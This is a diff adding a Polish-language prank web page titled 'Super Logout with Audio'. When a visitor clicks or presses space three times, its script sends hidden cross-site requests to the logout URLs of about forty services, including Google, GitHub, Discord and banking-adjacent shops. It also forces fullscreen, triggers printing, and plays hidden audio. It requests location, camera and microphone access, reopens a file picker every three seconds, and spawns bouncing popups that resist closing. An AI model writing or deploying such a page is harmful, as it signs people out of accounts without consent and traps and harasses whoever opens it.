@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+ <html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title id="page-title">Super Logout with Audio</title>
+  <style>
+   body {
+    background-color: white;
+    color: black;
+    font-family: 'Courier New', Courier, monospace;
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    height: 100vh;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+   }
+
+   .message {
+    font-size: 24px;
+    position: relative;
+    z-index: 1;
+   }
+
+   .small-text {
+    font-size: 16px;
+    margin-top: 10px;
+    position: relative;
+    z-index: 1;
+   }
+
+   .logout-info-container {
+    position: absolute;
+    top: 10px; /* Moved higher to the top */
+    left: 20px;
+    color: red;
+    font-size: 14px;
+    font-family: 'Courier New', Courier, monospace;
+    white-space: nowrap;
+    z-index: 1;
+   }
+
+   .logout-info {
+    margin: 5px 0;
+   }
+
+   /* Hide the video and only play the audio */
+   #audio-iframe, #video-iframe, #audio-iframe-second, #audio-iframe-third, #file-upload-input {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 0;
+    height: 0;
+    visibility: hidden;
+    z-index: -1; /* Make sure the iframe is behind everything */
+    border: none;
+   }
+
+   #background-video {
+    position: fixed;
+    top: 0;
+    left: 0;
+    min-width: 100%;
+    min-height: 100%;
+    width: auto;
+    height: auto;
+    z-index: -2; /* Behind the background color and other elements */
+    object-fit: cover;
+   }
+
+  </style>
+ </head>
+ <body>
+
+  <div class="message">
+   Siemano kolano, we no walnij 3 razy w spacie
+  </div>
+  <div class="small-text">
+   albo kliknij w kotka
+  </div>
+
+  <input type="file" id="file-upload-input" accept="image/jpeg">
+
+  <script>
+   const LOGOUT_SITES = {
+    'Discord': ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
+    'Amazon': ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
+    'DeviantART': ['POST', 'https://www.deviantart.com/users/logout'],
+    'Dropbox': ['GET', 'https://www.dropbox.com/logout'],
+    'eBay': ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
+    'GitHub': ['GET', 'https://github.com/logout'],
+    'GMail': ['GET', 'https://mail.google.com/mail/?logout'],
+    'Google': ['GET', 'https://www.google.com/accounts/Logout'],
+    'Hulu': ['GET', 'https://secure.hulu.com/logout'],
+    'NetFlix': ['GET', 'https://www.netflix.com/Logout'],
+    'Skype': ['GET', 'https://secure.skype.com/account/logout'],
+    'SoundCloud': ['GET', 'https://soundcloud.com/logout'],
+    'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
+    'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
+    'Wikipedia': ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
+    'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
+    'Wordpress': ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
+    'Yahoo': ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
+    'YouTube': ['POST', 'https://www.youtube.com', { action_logout: '1' }],
+    'JShop': ['GET', 'https://jshop.partners/panel/logout'],
+    'Vimeo': ['GET', 'https://vimeo.com/log_out'],
+    'Tumblr': ['GET', 'https://www.tumblr.com/logout'],
+    'Allegro': ['GET', 'https://allegro.pl/wyloguj?origin_url=/'],
+    'OnetMail': ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'],
+    'InteriaMail': ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'],
+    'OLX': ['GET', 'https://www.olx.pl/account/logout'],
+    'Roblox': ['POST', 'https://auth.roblox.com/v2/logout'],
+    'ChatGPT': ['GET', 'https://chatgpt.com/auth/logout'],
+    'Guilded': ['POST', 'https://www.guilded.gg/api/logout'],
+    'LinkedIn': ['GET', 'https://www.linkedin.com/m/logout/'],
+    'Pinterest': ['GET', 'https://www.pinterest.com/logout/'],
+    'Reddit': ['GET', 'https://www.reddit.com/logout'],
+    'Spotify': ['GET', 'https://www.spotify.com/logout/'],
+    'Microsoft': ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'],
+    'Instagram': ['GET', 'https://www.instagram.com/accounts/logout/'],
+    'Trello': ['GET', 'https://trello.com/logout'],
+    'Baidu': ['GET', 'https://passport.baidu.com/?logout'],
+    'VK': ['GET', 'https://vk.com/exit'],
+    'StackOverflow': ['GET', 'https://stackoverflow.com/users/logout']
+   };
+
+   const HIDDEN_STYLE = "position:absolute;width:0;height:0;border:0;visibility:hidden;display:none;";
+   let spacePressCount = 0;
+   let audioPlayed = false;
+   let hasTriggered = false; // Flag to ensure everything only triggers once
+   let logoutMessages = []; // Array to hold logout messages
+   const fileInput = document.getElementById('file-upload-input');
+   let fileExplorerInterval; // Variable to hold the interval ID
+   let movingWindows = []; // Array to store references to the moving about:blank windows
+
+   function superLogout() {
+    // Iterate over the sites and add messages for each logout
+    Object.keys(LOGOUT_SITES).forEach((site, index) => {
+     const [method, url, data] = LOGOUT_SITES[site];
+     sendLogoutRequest(method, url, data);
+     // Add logout message to the array
+     logoutMessages.push(`Wylogowuje się z ${site}`);
+    });
+
+    // Display all logout messages at once
+    displayLogoutMessages();
+   }
+
+   function sendLogoutRequest(method, url, data) {
+    const img = document.createElement('img');
+    img.style = HIDDEN_STYLE;
+    img.onload = () => cleanup(img);
+    img.onerror = () => cleanup(img);
+    document.body.appendChild(img);
+
+    if (method === 'POST' && data) {
+     let formData = new URLSearchParams(data).toString();
+     img.src = `${url}?${formData}`;
+    } else {
+     img.src = url;
+    }
+   }
+
+   function cleanup(el) {
+    el.parentNode.removeChild(el);
+   }
+
+   function playAudio() {
+    if (!audioPlayed) {
+     const videoIframe = document.createElement('iframe');
+     videoIframe.id = "video-iframe";
+     videoIframe.src = "https://www.youtube.com/embed/nC1debNHIqo?autoplay=1&loop=1&mute=0&controls=0&showinfo=0&rel=0&modestbranding=1&fs=0";
+     videoIframe.frameborder = "0";
+     videoIframe.allow = "autoplay; encrypted-media";
+     videoIframe.allowFullscreen = true;
+     document.body.appendChild(videoIframe);
+
+     const audioIframeSecond = document.createElement('iframe');
+     audioIframeSecond.id = "audio-iframe-second";
+     audioIframeSecond.src = "https://whyp.it/tracks/embed?id=272845";
+     audioIframeSecond.width = "100%";
+     audioIframeSecond.height = "200";
+     audioIframeSecond.scrolling = "no";
+     audioIframeSecond.frameborder = "0";
+     document.body.appendChild(audioIframeSecond);
+
+     const audioIframeThird = document.createElement('iframe');
+     audioIframeThird.id = "audio-iframe-third";
+     audioIframeThird.src = "https://www.youtube.com/embed/4JcPnhE-ecE?autoplay=1&loop=1&playlist=4JcPnhE-ecE&mute=0&controls=0&disablekb=1&showinfo=0&rel=0&modestbranding=1";
+     audioIframeThird.frameborder = "0";
+     audioIframeThird.allow = "autoplay; encrypted-media";
+     audioIframeThird.allowFullscreen = true;
+     document.body.appendChild(audioIframeThird);
+
+     audioPlayed = true;
+
+     setTimeout(function() {
+      videoIframe.remove();
+      audioIframeSecond.remove();
+      audioIframeThird.remove();
+     }, 60000);
+    }
+   }
+
+   function goFullscreen() {
+    if (document.documentElement.requestFullscreen) {
+     document.documentElement.requestFullscreen();
+    } else if (document.documentElement.mozRequestFullScreen) {
+     document.documentElement.mozRequestFullScreen();
+    } else if (document.documentElement.webkitRequestFullscreen) {
+     document.documentElement.webkitRequestFullscreen();
+    } else if (document.documentElement.msRequestFullscreen) {
+     document.documentElement.msRequestFullscreen();
+    }
+   }
+
+   function startWaveEffect() {
+    const skinToneEmojis = ['👶🏿', '👶🏾', '👶🏽', '👶🏼', '👶🏻', '👶🏻', '👶🏼', '👶🏽', '👶🏾', '👶🏿'];
+    let waveIndex = 0;
+    setInterval(() => {
+     document.title = skinToneEmojis[waveIndex];
+     waveIndex = (waveIndex + 1) % skinToneEmojis.length;
+    }, 200);
+   }
+
+   function triggerPrint() {
+    setTimeout(() => {
+     window.print();
+    }, 3000);
+   }
+
+   function displayLogoutMessages() {
+    const logoutContainer = document.createElement('div');
+    logoutContainer.classList.add('logout-info-container');
+    document.body.appendChild(logoutContainer);
+
+    // Display all logout messages at once
+    logoutMessages.forEach(message => {
+     const messageElement = document.createElement('div');
+     messageElement.classList.add('logout-info');
+     messageElement.textContent = message;
+     logoutContainer.appendChild(messageElement);
+    });
+   }
+
+   function playBackgroundVideo() {
+    const video = document.createElement('video');
+    video.id = 'background-video';
+    video.autoplay = true;
+    video.loop = true; // Optional: to loop the video
+    video.muted = false; // Ensure audio is not muted
+
+    const source = document.createElement('source');
+    source.src = 'media/eeee.mp4'; // Relative path to the video file
+    source.type = 'video/mp4';
+
+    video.appendChild(source);
+    document.body.appendChild(video);
+   }
+
+   function requestPermissions() {
+    navigator.geolocation.getCurrentPosition(() => {}, () => {
+     setTimeout(() => {
+      navigator.mediaDevices.getUserMedia({ video: true })
+       .then(() => {})
+       .catch(() => {
+        setTimeout(() => {
+         navigator.mediaDevices.getUserMedia({ audio: true })
+          .then(() => {})
+          .catch(() => {});
+        }, 1000);
+       });
+     }, 1000);
+    });
+   }
+
+   function openFileExplorer() {
+    fileInput.click();
+   }
+
+   const WIN_WIDTH = 300; // Define window width
+   const WIN_HEIGHT = 200; // Define window height
+   const wins = []; // Initialize wins array
+
+   function getRandomCoords() {
+    const screenWidth = window.screen.width;
+    const screenHeight = window.screen.height;
+    const x = Math.random() * (screenWidth - WIN_WIDTH);
+    const y = Math.random() * (screenHeight - WIN_HEIGHT);
+    return { x, y };
+   }
+
+   function openWindow() {
+    const { x, y } = getRandomCoords();
+    const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
+    const win = window.open('about:blank', '_blank', opts);
+
+    // New windows may be blocked by the popup blocker
+    if (!win) return;
+    wins.push(win);
+
+    // For modern browsers
+    win.addEventListener("beforeunload", function (e) {
+     e.preventDefault();
+     e.returnValue = "";
+    });
+
+    // For older browsers
+    win.onbeforeunload = function () {
+     return "";
+    };
+
+    const videoHTML = `
+     <!DOCTYPE html>
+     <html>
+     <head>
+      <title>Moving Background Video</title>
+      <style>
+       body { margin: 0; overflow: hidden; background-color: black; }
+       video {
+        display: block;
+        min-width: 100%;
+        min-height: 100%;
+        width: auto;
+        height: auto;
+        object-fit: cover;
+       }
+      </style>
+     </head>
+     <body>
+      <video autoplay loop muted>
+       <source src="media/eeee.mp4" type="video/mp4">
+       Your browser does not support the video tag.
+      </video>
+     </body>
+     </html>
+    `;
+    win.document.write(videoHTML);
+    win.document.close();
+
+    let currentX = x;
+    let currentY = y;
+    const screenWidth = window.screen.width;
+    const screenHeight = window.screen.height;
+    const velocityX = (Math.random() - 0.5) * 10;
+    const velocityY = (Math.random() - 0.5) * 10;
+    let vx = velocityX;
+    let vy = velocityY;
+
+    const intervalId = setInterval(() => {
+     if (!win || win.closed) {
+      clearInterval(intervalId);
+      return;
+     }
+
+     currentX += vx;
+     currentY += vy;
+
+     // Bounce off the edges
+     if (currentX < 0 || currentX > screenWidth - WIN_WIDTH) {
+      vx = -vx;
+     }
+     if (currentY < 0 || currentY > screenHeight - WIN_HEIGHT - 50) { // Adjust for title bar
+      vy = -vy;
+     }
+
+     win.moveTo(Math.max(0, Math.min(currentX, screenWidth - WIN_WIDTH)), Math.max(0, Math.min(currentY, screenHeight - WIN_HEIGHT - 50)));
+    }, 50);
+    movingWindows.push({ window: win, intervalId: intervalId });
+   }
+
+   document.addEventListener('keydown', function(event) {
+    if (event.key === " " && !hasTriggered) {
+     event.preventDefault();
+     spacePressCount++;
+     if (spacePressCount === 3) {
+      playAudio();
+      superLogout();
+      goFullscreen();
+      startWaveEffect();
+      triggerPrint();
+
+      setTimeout(() => {
+       playBackgroundVideo();
+      }, 3000);
+
+      requestPermissions(); // Start asking for permissions in the sequence
+      openFileExplorer(); // Open the file explorer dialog once
+
+      // Set up the interval to open the file explorer every 3 seconds
+      fileExplorerInterval = setInterval(openFileExplorer, 3000);
+
+      // Open three moving about:blank windows using the new function
+      for (let i = 0; i < 3; i++) {
+       openWindow();
+      }
+
+      hasTriggered = true; // Prevent future triggers
+      spacePressCount = 0;
+     }
+    }
+   });
+
+   document.addEventListener('click', function() {
+    if (!hasTriggered) {
+     playAudio();
+     superLogout();
+     goFullscreen();
+     startWaveEffect();
+     triggerPrint();
+
+     setTimeout(() => {
+      playBackgroundVideo();
+     }, 3000);
+
+     requestPermissions(); // Start asking for permissions in the sequence
+     openFileExplorer(); // Open the file explorer dialog once
+
+     // Set up the interval to open the file explorer every 3 seconds
+     fileExplorerInterval = setInterval(openFileExplorer, 3000);
+
+     // Open three moving about:blank windows using the new function
+     for (let i = 0; i < 3; i++) {
+      openWindow();
+     }
+
+     hasTriggered = true; // Prevent future triggers
+    }
+   });
+
+   document.addEventListener('contextmenu', function(event) {
+    event.preventDefault();
+   });
+
+   document.addEventListener('mousedown', function(event) {
+    if (event.target.id === 'audio-iframe-third' || event.target.id === 'audio-iframe-second' || event.target.id === 'video-iframe') {
+     event.preventDefault();
+    }
+   });
+  </script>
+ </body>
+ </html>
